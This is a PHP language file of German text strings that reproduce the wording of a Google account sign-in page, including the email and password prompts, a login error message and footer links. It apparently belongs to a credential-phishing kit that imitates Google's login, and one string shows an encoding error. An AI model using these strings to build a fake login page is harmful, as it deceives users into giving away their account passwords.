<?php
/*
------------------
Language: Germany
------------------
*/
 
$lang = array();
// Header 
$lang['TITTLE'] = 'Anmeldung-Google-Konto';
$lang['SIGN_IN'] = 'Einloggen';
$lang['CONT_GMAIL'] = 'weiterhin Gmail';
$lang['PASSWORD'] = 'Passwort';
$lang['EMAIL'] = 'E-Mail oder Telefon';
$lang['NEXT'] = 'N채chster';
$lang['SIGN'] = 'Einloggen';
$lang['FORGOT'] = 'Passwort vergessen?';
$lang['ERROR'] = 'falsch Benutzername und Passwort';

//Google Log in
$lang['ONE'] = 'Ein Account. Alles von Google.';
$lang['SIGN_WITH'] = 'Melde dich mit deinem Google-Account an';
$lang['STAY'] = 'Bleiben Sie angemeldet';
$lang['KEEP_CHECKED'] ='Lassen Sie dies zu Ihrer Bequemlichkeit aktiviert. Bei gemeinsam genutzten Geräten werden zusätzliche Vorsichtsmaßnahmen empfohlen.';
$lang['SIGN_DIFFERENT'] = 'Melden Sie sich mit einem anderen Account an';
$lang['EVERYTHING'] = 'Ein Google-Konto für alles Google';
$lang['ABOUT'] = 'Über Google';
$lang['PRIVACY'] = 'Privatsphäre';
$lang['TERM'] = 'Bedingungen';
$lang['HELP'] = 'Hilfe';
$lang['FIND_ACCOUNT'] = 'Mein Konto suchen';
$lang['CREATE'] = 'Benutzerkonto anlegen';
?>